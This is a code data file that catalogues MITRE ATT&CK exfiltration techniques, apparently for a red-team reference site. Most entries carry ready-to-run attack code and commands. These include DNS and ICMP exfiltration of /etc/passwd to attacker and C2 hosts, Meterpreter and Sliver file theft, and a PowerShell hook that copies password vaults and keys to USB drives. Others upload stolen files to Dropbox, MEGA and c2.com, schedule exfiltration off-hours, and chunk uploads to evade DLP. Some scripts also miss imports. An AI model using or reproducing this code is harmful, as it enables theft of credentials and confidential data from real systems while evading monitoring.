export const exfiltrationTechniques = [
  {
    id: "T1048",
    name: "Exfiltration Over Alternative Protocol",
    summary: "DNS exfil • ICMP • FTP • SMTP",
    description: "Exfiltrating data using protocols other than the primary C2 channel such as DNS, ICMP, FTP, or SMTP.",
    tags: ["T1048", "DNS exfiltration", "ICMP", "FTP", "alternative protocol"],
    steps: [
      { type: "comment", content: "# T1048.001 - DNS exfiltration via subdomain encoding" },
      { type: "code", content: "import base64, subprocess, os\n\ndef dns_exfil(data: bytes, domain='exfil.attacker.com'):\n    \"\"\"Exfiltrate data by encoding in DNS queries\"\"\"\n    encoded = base64.b32encode(data).decode().lower().rstrip('=')\n    # Split into 60-char chunks (DNS label limit)\n    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]\n    for i, chunk in enumerate(chunks):\n        os.system(f'nslookup {i}.{chunk}.{domain}')\n\n# Exfiltrate /etc/passwd via DNS\nwith open('/etc/passwd', 'rb') as f:\n    dns_exfil(f.read())" },
      { type: "comment", content: "# T1048.003 - ICMP data exfiltration" },
      { type: "cmd", content: "# Use ptunnel or icmptunnel for ICMP exfil:\nptunnel-ng -p c2server.com -lp 1234 -da fileserver -dp 80\n# Or with nping:\nnping --icmp c2server.com --data-string \"$(cat /etc/passwd | base64)\"" },
    ]
  },
  {
    id: "T1041",
    name: "Exfiltration Over C2 Channel",
    summary: "upload via C2 beacon • Meterpreter upload",
    description: "Stealing data using the same channel used for C2 communication.",
    tags: ["T1041", "C2 exfiltration", "Meterpreter upload", "beacon upload"],
    steps: [
      { type: "comment", content: "# Exfiltrate data through existing Meterpreter session" },
      { type: "cmd", content: "meterpreter > upload C:\\Users\\user\\Documents\\sensitive.docx /tmp/\n# Or: download in reverse - attacker downloads from victim\nmeterpreter > download 'C:\\Users\\user\\Desktop\\passwords.kdbx' /tmp/" },
      { type: "comment", content: "# Sliver session file download" },
      { type: "cmd", content: "sliver (victim) > download C:\\Users\\user\\Documents\\confidential.xlsx" },
    ]
  },
  {
    id: "T1011",
    name: "Exfiltration Over Other Network Medium",
    summary: "Bluetooth • NFC • wireless channel",
    description: "Exfiltrating data over alternative network mediums such as Bluetooth, NFC, or cellular connections.",
    tags: ["T1011", "Bluetooth exfil", "NFC", "wireless exfil"],
    steps: [
      { type: "comment", content: "# T1011.001 - Bluetooth exfiltration from compromised host" },
      { type: "cmd", content: "# Pair with attacker device and transfer:\nhcitool scan  # Find nearby Bluetooth devices\nobexftp -b ATTACKER_BT_MAC -p sensitive_file.zip" },
    ]
  },
  {
    id: "T1052",
    name: "Exfiltration Over Physical Medium",
    summary: "USB data theft • air-gap exfil",
    description: "Exfiltrating data over physical media such as USB drives when network exfiltration is not possible.",
    tags: ["T1052", "USB exfil", "physical medium", "air-gap"],
    steps: [
      { type: "comment", content: "# Auto-copy sensitive files to USB when inserted" },
      { type: "code", content: "# PowerShell - monitor for removable drives and auto-exfil\nRegister-WmiEvent -Query \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2\" -Action {\n    $drive = $Event.SourceEventArgs.NewEvent.DriveName\n    $patterns = @('*.docx','*.xlsx','*.pdf','*.kdbx','*.pem')\n    foreach ($p in $patterns) {\n        Get-ChildItem -Path C:\\Users\\ -Filter $p -Recurse -ErrorAction SilentlyContinue |\n            Where-Object {$_.Length -lt 50MB} |\n            Copy-Item -Destination \"${drive}\\Backup\\\"\n    }\n}" },
    ]
  },
  {
    id: "T1567",
    name: "Exfiltration Over Web Service",
    summary: "MEGA • Dropbox • Pastebin • cloud upload",
    description: "Exfiltrating data to legitimate cloud storage services to blend in with normal business traffic.",
    tags: ["T1567", "Dropbox", "MEGA", "OneDrive", "cloud exfil"],
    steps: [
      { type: "comment", content: "# T1567.002 - Exfiltrate to cloud storage (Dropbox)" },
      { type: "code", content: "import requests\n\ndef upload_to_dropbox(filepath: str, token: str):\n    with open(filepath, 'rb') as f:\n        data = f.read()\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Dropbox-API-Arg': f'{{\"path\":\"/backup/{os.path.basename(filepath)}\",\"mode\":\"add\"}}',\n        'Content-Type': 'application/octet-stream'\n    }\n    requests.post('https://content.dropboxapi.com/2/files/upload', headers=headers, data=data)\n\nupload_to_dropbox('collected_data.zip', 'ATTACKER_DROPBOX_TOKEN')" },
      { type: "comment", content: "# T1567.002 - MEGA upload via megatools" },
      { type: "cmd", content: "megaput --username attacker@email.com --password pass collected_data.zip\n# Or rclone to any cloud provider:\nrclone copy collected_data/ gdrive:exfil/ --drive-service-account-file sa.json" },
    ]
  },
  {
    id: "T1029",
    name: "Scheduled Transfer",
    summary: "off-hours exfil • scheduled upload",
    description: "Scheduling data exfiltration to occur at specific times to blend in with normal traffic or avoid detection during monitoring hours.",
    tags: ["T1029", "scheduled transfer", "off-hours", "timed exfil"],
    steps: [
      { type: "comment", content: "# Schedule exfiltration during off-hours via cron" },
      { type: "cmd", content: "echo '0 2 * * * /tmp/exfil.sh' | crontab -  # Run at 2AM daily\n# Windows:\nschtasks /create /tn 'Backup' /tr 'C:\\Windows\\Temp\\exfil.bat' /sc daily /st 02:00" },
    ]
  },
  {
    id: "T1030",
    name: "Data Transfer Size Limits",
    summary: "chunk exfil • rate limiting • avoid detection",
    description: "Exfiltrating data in chunks below size thresholds to avoid triggering data loss prevention controls.",
    tags: ["T1030", "chunked exfil", "size limits", "DLP bypass"],
    steps: [
      { type: "comment", content: "# Split data into small chunks to evade DLP" },
      { type: "code", content: "import os, requests\n\ndef chunk_exfil(filepath: str, chunk_size_mb=5):\n    \"\"\"Exfiltrate file in chunks below DLP thresholds\"\"\"\n    chunk_size = chunk_size_mb * 1024 * 1024\n    with open(filepath, 'rb') as f:\n        chunk_num = 0\n        while True:\n            chunk = f.read(chunk_size)\n            if not chunk:\n                break\n            # Send with random delay to avoid rate detection\n            import time; time.sleep(random.uniform(10, 60))\n            requests.post('https://c2.com/upload', data=chunk,\n                headers={'X-Chunk': str(chunk_num), 'X-File': os.path.basename(filepath)})\n            chunk_num += 1" },
    ]
  },
];